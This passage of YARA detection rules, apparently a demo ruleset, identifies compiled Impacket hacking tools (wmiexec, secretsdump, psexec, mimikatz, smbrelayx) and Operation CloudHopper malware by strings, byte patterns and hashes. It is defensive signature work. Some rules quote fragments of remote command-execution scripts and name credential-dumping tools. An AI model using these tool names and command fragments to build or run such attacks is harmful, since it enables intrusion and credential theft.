 strings:\n      $x1 = \"strNetUse = \\\"cmd.exe /c net use \\\\\\\\\\\" & host\" fullword ascii\n      $x2 = \"localcmd = \\\"cmd.exe /c \\\" & command \" ascii\n      $x3 = \"& \\\" > \\\" & TempFile & \\\" 2>&1\\\"  '2>&1 err\" fullword ascii\n      $x4 = \"strExec = \\\"cmd.exe /c \\\" & cmd & \\\" >> \\\" & resultfile & \\\" 2>&1\\\"  '2>&1 err\" fullword ascii\n      $x5 = \"TempFile = objShell.ExpandEnvironmentStrings(\\\"%TEMP%\\\") & \\\"\\\\wmi.dll\\\"\" fullword ascii\n      $a1 = \"WMIEXEC ERROR: Command -> \" ascii\n      $a2 = \"WMIEXEC : Command result will output to\" fullword ascii\n      $a3 = \"WMIEXEC : Target ->\" fullword ascii\n      $a4 = \"WMIEXEC : Login -> OK\" fullword ascii\n      $a5 = \"WMIEXEC : Process created. PID:\" fullword ascii\n   condition: \n      ( filesize < 40KB and 1 of them ) or 3 of them\n}\n\nrule Impacket_Tools_wmiexec_RID3000 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"19544863758341fe7276c59d85f4aa17094045621ca9c98f8a9e7307c290bad4\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bwmiexec.exe.manifest\" fullword ascii\n      $s2 = \"swmiexec\" fullword ascii\n      $s3 = \"\\\\yzHPlU=QA\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 2 of them )\n}\n\nrule Impacket_Tools_sniffer_RID2FFB : DEMO EXE FILE HKTL T1040 {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"efff15e1815fb3c156678417d6037ddf4b711a3122c9b5bc2ca8dc97165d3769\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssniffer\" fullword ascii\n      $s2 = \"impacket.dhcp(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}\n\nrule Impacket_Tools_mmcexec_RID2FF0 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"263a1655a94b7920531e123a8c9737428f2988bf58156c62408e192d4b2a63fc\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"smmcexec\" fullword ascii\n      $s2 = \"\\\\yzHPlU=QA\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 16000KB and all of them )\n}\n\nrule Impacket_Tools_ifmap_RID2F1B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 11:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"20a1f11788e6cc98a76dca2db4691963c054fc12a4d608ac41739b98f84b3613\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bifmap.exe.manifest\" fullword ascii\n      $s2 = \"impacket.dcerpc.v5.epm(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}\n\nrule samrdump_RID2A7A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 06:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4c2921702d18e0874b57638433474e54719ee6dfa39d323839d216952c5c834a\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"bsamrdump_RID2A7A.exe.manifest\" fullword ascii\n      $s3 = \"ssamrdump_RID2A7A\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_rpcdump_RID3009 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"21d85b36197db47b94b0f4995d07b040a0455ebbe6d413bc33d926ee4e0315d9\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"srpcdump\" fullword ascii\n      $s2 = \"impacket.dcerpc.v5.epm(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_secretsdump_RID31BD : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 13:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"47afa5fd954190df825924c55112e65fd8ed0f7e1d6fd403ede5209623534d7d\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssecretsdump\" fullword ascii\n      $s2 = \"impacket.ese(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_esentutl_RID3082 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"70d854953d3ebb2c252783a4a103ba0e596d6ab447f238af777fb37d2b64c0cd\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.ese(\" ascii\n      $s2 = \"sesentutl\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 11000KB and all of them )\n}\n\nrule Impacket_Tools_opdump_RID2FA3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e2205539f29972d4e2a83eabf92af18dd406c9be97f70661c336ddf5eb496742\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"bopdump.exe.manifest\" fullword ascii\n      $s3 = \"sopdump\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_sniff_RID2F24 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 11:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8ab2b60aadf97e921e3a9df5cf1c135fbc851cb66d09b1043eaaa1dc01b9a699\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssniff\" fullword ascii\n      $s2 = \"impacket.eap(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}\n\nrule Impacket_Tools_smbexec_RID2FF5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7d715217e23a471d42d95c624179fe7de085af5670171d212b7b798ed9bf07c2\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"logging.config(\" ascii\n      $s2 = \"ssmbexec\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_goldenPac_RID309B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4f7fad0676d3c3d2d89e8d4e74b6ec40af731b1ddf5499a0b81fc3b1cd797ee3\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.examples.serviceinstall(\" ascii\n      $s2 = \"bgoldenPac.exe\" fullword ascii\n      $s3 = \"json.scanner(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_netview_RID3010 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ab909f8082c2d04f73d8be8f4c2640a5582294306dffdcc85e83a39d20c49ed6\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.dcerpc.v5.wkst(\" ascii\n      $s2 = \"dummy_threading(\" ascii\n      $s3 = \"snetview\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_smbtorture_RID3165 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 13:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d2856e98011541883e5b335cb46b713b1a6b2c414966a9de122ee7fb226aa7f7\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket\" fullword ascii\n      $s2 = \"ssmbtorture\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_mimikatz_RID3074 : DEMO EXE FILE HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2d8d500bcb3ffd22ddd8bd68b5b2ce935c958304f03729442a20a28b2c0328c1\"\n      tags = \"DEMO, EXE, FILE, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket\" fullword ascii\n      $s2 = \"smimikatz\" fullword ascii\n      $s3 = \"otwsdlc\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_smbrelayx_RID30E5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9706eb99e48e445ac4240b5acb2efd49468a800913e70e40b25c2bf80d6be35f\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.examples.secretsdump\" fullword ascii\n      $s2 = \"impacket.examples.serviceinstall\" fullword ascii\n      $s3 = \"impacket.smbserver(\" ascii\n      $s4 = \"SimpleHTTPServer(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and 3 of them )\n}\n\nrule Impacket_Tools_wmipersist_RID3165 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 13:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2527fff1a3c780f6a757f13a8912278a417aea84295af1abfa4666572bbbf086\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"swmipersist\" fullword ascii\n      $s2 = \"\\\\yzHPlU=QA\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_lookupsid_RID30E8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:59:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"47756725d7a752d3d3cfccfb02e7df4fa0769b72e008ae5c85c018be4cf35cc1\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"slookupsid\" fullword ascii\n      $s2 = \"impacket.dcerpc\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}\n\nrule Impacket_Tools_wmiquery_RID3091 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"202a1d149be35d96e491b0b65516f631f3486215f78526160cf262d8ae179094\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"swmiquery\" fullword ascii\n      $s2 = \"\\\\yzHPlU=QA\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Impacket_Tools_atexec_RID2F88 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"337bd5858aba0380e16ee9a9d8f0b3f5bfc10056ced4e75901207166689fbedc\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"batexec.exe.manifest\" fullword ascii\n      $s2 = \"satexec\" fullword ascii\n      $s3 = \"impacket.dcerpc\" fullword ascii\n      $s4 = \"# CSZq\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 3 of them )\n}\n\nrule Impacket_Tools_psexec_RID2F96 : DEMO EXE FILE HKTL T1569_002 {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"27bb10569a872367ba1cfca3cf1c9b428422c82af7ab4c2728f501406461c364\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.examples.serviceinstall(\" ascii\n      $s2 = \"spsexec\" fullword ascii\n      $s3 = \"impacket.examples.remcomsvc(\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 2 of them )\n}\n\nrule Impacket_Tools_Generic_1_RID305B : DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:36:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4f7fad0676d3c3d2d89e8d4e74b6ec40af731b1ddf5499a0b81fc3b1cd797ee3\"\n      hash2 = \"d256d1e05695d62a86d9e76830fcbb856ba7bd578165a561edd43b9f7fdb18a3\"\n      hash3 = \"2d8d500bcb3ffd22ddd8bd68b5b2ce935c958304f03729442a20a28b2c0328c1\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bpywintypes27.dll\" fullword ascii\n      $s2 = \"hZFtPC\" fullword ascii\n      $s3 = \"impacket\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and all of ( $s* ) ) or ( all of them )\n}\n\nrule OpCloudHopper_Malware_1_RID2FED : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"27876dc5e6f746ff6003450eeea5e98de5d96cbcba9e4694dad94ca3e9fb1ddc\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n      $s2 = \"z{[ZZYUKKKIIGGGGGGGGGGGGG\" fullword ascii\n      $s3 = \"EEECEEC\" fullword ascii\n      $s4 = \"IIEFEE\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule OpCloudHopper_Malware_3_RID2FEF : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c21eaadf9ffc62ca4673e27e06c16447f103c0cf7acd8db6ac5c8bd17805e39d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"operator \\\"\\\" \" fullword ascii\n      $s7 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n      $s11 = \"InvokeMainViaCRT\" fullword ascii\n      $s12 = \".?AVAES@@\" fullword ascii\n      $op1 = { b6 4c 06 f5 32 cf 88 4c 06 05 0f b6 4c 06 f9 32 } \n      $op2 = { 06 fc eb 03 8a 5e f0 85 c0 74 05 8a 0c 06 eb 03 } \n      $op3 = { 7e f8 85 c0 74 06 8a 74 06 08 eb 03 8a 76 fc 85 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( all of ( $s* ) and 1 of ( $op* ) ) or all of ( $op* ) ) or ( 5 of them )\n}\n\nrule OpCloudHopper_Dropper_1_RID3000 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"411571368804578826b8f24f323617f51b068809b1c769291b21125860dc3f4e\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{\\\\version2}{\\\\edmins0}{\\\\nofpages1}{\\\\nofwords11}{\\\\nofchars69}{\\\\*\\\\company google}{\\\\nofcharsws79}{\\\\vern24611}{\\\\*\\\\password\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5c7b and filesize < 700KB and all of them )\n}\n\nrule OpCloudHopper_Malware_4_RID2FF0 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"ae6b45a92384f6e43672e617c53a44225e2944d66c1ffb074694526386074145\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"operator \\\"\\\" \" fullword ascii\n      $s9 = \"InvokeMainViaCRT\" fullword ascii\n      $s10 = \".?AVAES@@\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them )\n}\n\nrule OpCloudHopper_Malware_5_RID2FF1 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"beb1bc03bb0fba7b0624f8b2330226f8a7da6344afd68c5bc526f9d43838ef01\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CWINDOWSSYSTEMROOT\" fullword ascii\n      $x2 = \"YJ_D_KROPOX_M_NUJI_OLY_S_JU_MOOK\" fullword ascii\n      $x3 = \"NJK_JK_SED_PNJHGFUUGIOO_PIY\" fullword ascii\n      $x4 = \"c_VDGQBUl}YSB_C_VDlqSDYFU\" fullword ascii\n      $s7 = \"FALLINLOVE\" fullword ascii\n      $op1 = { 83 ec 60 8d 4c 24 00 e8 6f ff ff ff 8d 4c 24 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 4 of them )\n}\n\nrule OpCloudHopper_Malware_6_RID2FF2 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aabebea87f211d47f72d662e2449009f83eac666d81b8629cf57219d0ce31af6\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"YDNCCOVZKXGRVQPOBRNXXQVNQYXBBCONCOQEGYELIRBEYOVODGXCOXTHXPCXNGUCHRVWKKZSYQMAOWWGHRSPRGSEUWYMEFZHRTHO\" fullword ascii\n      $s2 = \"psychiatry.dat\" fullword ascii\n      $s3 = \"meekness.lnk\" fullword ascii\n      $s4 = \"SOFTWARE\\\\EGGORG\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule OpCloudHopper_Malware_7_RID2FF3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"44a7bea8a08f4c2feb74c6a00ff1114ba251f3dc6922ea5ffab9e749c98cbdce\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"jepsjepsjepsjepsjepsjepsjepsjepsjepsjeps\" fullword ascii\n      $x2 = \"extOextOextOextO\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule OpCloudHopper_Malware_8_RID2FF4 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"19aa5019f3c00211182b2a80dd9675721dac7cfb31d174436d3b8ec9f97d898b\"\n      hash2 = \"5cebc133ae3b6afee27beb7d3cdb5f3d675c3f12b7204531f453e99acdaa87b1\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WSHELL32.dll\" fullword wide\n      $s2 = \"operator \\\"\\\" \" fullword ascii\n      $s3 = \"\\\" /t REG_SZ /d \\\"\" fullword wide\n      $s4 = \" /f /v \\\"\" fullword wide\n      $s5 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n      $s6 = \"AFX_DIALOG_LAYOUT\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 4 of them )\n}\n\nrule OpCloudHopper_Malware_9_RID2FF5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f0002b912135bcee83f901715002514fdc89b5b8ed7585e07e482331e4a56c06\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"MsMpEng.exe\" fullword ascii\n      $op0 = { 2b c7 50 e8 22 83 ff ff ff b6 c0 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule OpCloudHopper_Malware_10_RID301D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5b4028728d8011a2003b7ce6b9ec663dd6a60b7adcc20e2125da318e2d9e13f4\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"bakshell.EXE\" fullword wide\n      $s19 = \"bakshell Applicazione MFC\" fullword wide\n      